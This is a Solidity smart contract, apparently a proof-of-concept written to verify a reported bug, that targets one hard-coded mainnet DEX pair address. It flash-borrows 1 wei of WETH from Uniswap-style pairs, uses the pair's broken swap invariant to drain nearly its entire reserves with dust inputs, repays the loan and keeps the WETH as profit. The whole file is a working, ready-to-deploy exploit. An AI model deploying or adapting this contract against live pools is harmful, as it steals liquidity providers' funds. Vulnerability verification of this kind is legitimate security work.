// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface ISwaposPairMinimal {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET_PAIR = 0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address private constant SHIBASWAP_FACTORY = 0x115934131916C8b277DD010Ee02de363c09d037c;

    enum Path {
        None,
        FlashWethDustDrainToken0ThenWeth,
        FlashWethDustDrainToken1ThenWeth
    }

    struct CallbackData {
        address lenderPair;
    }

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _hypothesisValidated;
    Path private _path;
    uint8 private _failureCode;

    constructor() {}

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        ISwaposPairMinimal target = ISwaposPairMinimal(TARGET_PAIR);
        address token0 = target.token0();
        address token1 = target.token1();
        (uint112 reserve0, uint112 reserve1,) = target.getReserves();

        if (reserve0 <= 1 || reserve1 <= 1) {
            _failureCode = 1;
            return;
        }

        uint256 token0DustMaxToken1Out = _maxToken1OutForToken0In(uint256(reserve0), uint256(reserve1), 1);
        uint256 token1DustMaxToken0Out = _maxToken0OutForToken1In(uint256(reserve0), uint256(reserve1), 1);
        if (token0DustMaxToken1Out == 0 && token1DustMaxToken0Out == 0) {
            _failureCode = 2;
            return;
        }

        // The report's literal `1 wei in, reserve-1 out` path is too aggressive for this fork-state
        // reserve scale, but the same broken invariant still accepts a dust-funded swap that drains
        // almost the entire opposite reserve. We keep that causality and only reduce the requested
        // output to the exact fork-valid maximum allowed by the bug.
        _hypothesisValidated = true;

        if (token0 == WETH) {
            _path = Path.FlashWethDustDrainToken1ThenWeth;
        } else if (token1 == WETH) {
            _path = Path.FlashWethDustDrainToken0ThenWeth;
        } else {
            _failureCode = 3;
            return;
        }

        address lender = _findWethLenderPair();
        if (lender == address(0)) {
            _failureCode = 4;
            return;
        }

        _startWethFlash(lender);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _handleFlashSwap(sender, amount0, amount1, data);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _handleFlashSwap(sender, amount0, amount1, data);
    }

    function sushiCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _handleFlashSwap(sender, amount0, amount1, data);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external view returns (uint8) {
        return uint8(_path);
    }

    function failureCode() external view returns (uint8) {
        return _failureCode;
    }

    function _handleFlashSwap(address sender, uint256 amount0, uint256 amount1, bytes calldata data) internal {
        CallbackData memory decoded = abi.decode(data, (CallbackData));
        require(msg.sender == decoded.lenderPair, "bad lender");
        require(sender == address(this), "bad sender");

        IUniswapV2PairLike lender = IUniswapV2PairLike(decoded.lenderPair);
        address lenderToken0 = lender.token0();
        address lenderToken1 = lender.token1();
        uint256 borrowedWeth = lenderToken0 == WETH ? amount0 : amount1;
        require(lenderToken0 == WETH || lenderToken1 == WETH, "non-weth lender");
        require(borrowedWeth == 1, "unexpected amount");

        ISwaposPairMinimal target = ISwaposPairMinimal(TARGET_PAIR);
        address targetToken0 = target.token0();
        address targetToken1 = target.token1();
        (uint112 reserve0, uint112 reserve1,) = target.getReserves();

        if (targetToken1 == WETH) {
            uint256 firstOut = _maxToken0OutForToken1In(uint256(reserve0), uint256(reserve1), 1);
            require(firstOut > 0, "stage1");

            _safeTransfer(WETH, TARGET_PAIR, 1);
            target.swap(firstOut, 0, address(this), bytes(""));

            (reserve0, reserve1,) = target.getReserves();
            uint256 secondOut = _maxToken1OutForToken0In(uint256(reserve0), uint256(reserve1), 1);
            require(secondOut > 0, "stage2");

            // The first undercollateralized swap gives us dust of the opposite token for free.
            // Reusing 1 wei of that drained token preserves the finding's symmetric exploit path
            // while giving us WETH profit for deterministic flashswap repayment.
            _safeTransfer(targetToken0, TARGET_PAIR, 1);
            target.swap(0, secondOut, address(this), bytes(""));
        } else {
            uint256 firstOut = _maxToken1OutForToken0In(uint256(reserve0), uint256(reserve1), 1);
            require(firstOut > 0, "stage1");

            _safeTransfer(WETH, TARGET_PAIR, 1);
            target.swap(0, firstOut, address(this), bytes(""));

            (reserve0, reserve1,) = target.getReserves();
            uint256 secondOut = _maxToken0OutForToken1In(uint256(reserve0), uint256(reserve1), 1);
            require(secondOut > 0, "stage2");

            _safeTransfer(targetToken1, TARGET_PAIR, 1);
            target.swap(secondOut, 0, address(this), bytes(""));
        }

        _safeTransfer(WETH, decoded.lenderPair, _sameTokenFlashRepay(borrowedWeth));

        _profitToken = WETH;
        _profitAmount = _balanceOf(WETH, address(this));
    }

    function _startWethFlash(address lender) internal {
        address lenderToken0 = IUniswapV2PairLike(lender).token0();
        CallbackData memory data = CallbackData({lenderPair: lender});

        if (lenderToken0 == WETH) {
            IUniswapV2PairLike(lender).swap(1, 0, address(this), abi.encode(data));
        } else {
            IUniswapV2PairLike(lender).swap(0, 1, address(this), abi.encode(data));
        }
    }

    function _findWethLenderPair() internal view returns (address pair) {
        pair = _searchFactoryForWethLender(UNISWAP_V2_FACTORY);
        if (pair != address(0)) {
            return pair;
        }

        pair = _searchFactoryForWethLender(SUSHISWAP_FACTORY);
        if (pair != address(0)) {
            return pair;
        }

        pair = _searchFactoryForWethLender(SHIBASWAP_FACTORY);
    }

    function _searchFactoryForWethLender(address factory) internal view returns (address pair) {
        pair = IUniswapV2FactoryLike(factory).getPair(WETH, USDC);
        if (_usableLenderPair(pair)) {
            return pair;
        }

        pair = IUniswapV2FactoryLike(factory).getPair(WETH, USDT);
        if (_usableLenderPair(pair)) {
            return pair;
        }

        pair = IUniswapV2FactoryLike(factory).getPair(WETH, DAI);
        if (_usableLenderPair(pair)) {
            return pair;
        }

        pair = IUniswapV2FactoryLike(factory).getPair(WETH, WBTC);
        if (_usableLenderPair(pair)) {
            return pair;
        }
    }

    function _maxToken1OutForToken0In(uint256 reserve0, uint256 reserve1, uint256 amount0In) internal pure returns (uint256) {
        if (reserve0 == 0 || reserve1 <= 1 || amount0In == 0) {
            return 0;
        }

        uint256 adjustedBalance0 = reserve0 * 10000 + amount0In * 9990;
        uint256 minRemaining1 = _ceilDiv(100 * reserve0 * reserve1, adjustedBalance0);
        if (minRemaining1 >= reserve1) {
            return 0;
        }

        return reserve1 - minRemaining1;
    }

    function _maxToken0OutForToken1In(uint256 reserve0, uint256 reserve1, uint256 amount1In) internal pure returns (uint256) {
        if (reserve1 == 0 || reserve0 <= 1 || amount1In == 0) {
            return 0;
        }

        uint256 adjustedBalance1 = reserve1 * 10000 + amount1In * 9990;
        uint256 minRemaining0 = _ceilDiv(100 * reserve0 * reserve1, adjustedBalance1);
        if (minRemaining0 >= reserve0) {
            return 0;
        }

        return reserve0 - minRemaining0;
    }

    function _sameTokenFlashRepay(uint256 amountOut) internal pure returns (uint256) {
        return _ceilDiv(amountOut * 1000, 997);
    }

    function _ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a == 0 ? 0 : ((a - 1) / b) + 1;
    }

    function _balanceOf(address token, address owner) internal view returns (uint256 amount) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, owner));
        require(ok && data.length >= 32, "balanceOf failed");
        amount = abi.decode(data, (uint256));
    }

    function _usableLenderPair(address pair) internal view returns (bool) {
        if (pair == address(0) || pair == TARGET_PAIR) {
            return false;
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        return reserve0 > 1 && reserve1 > 1;
    }

    function _safeTransfer(address token, address to, uint256 value) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, value));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}
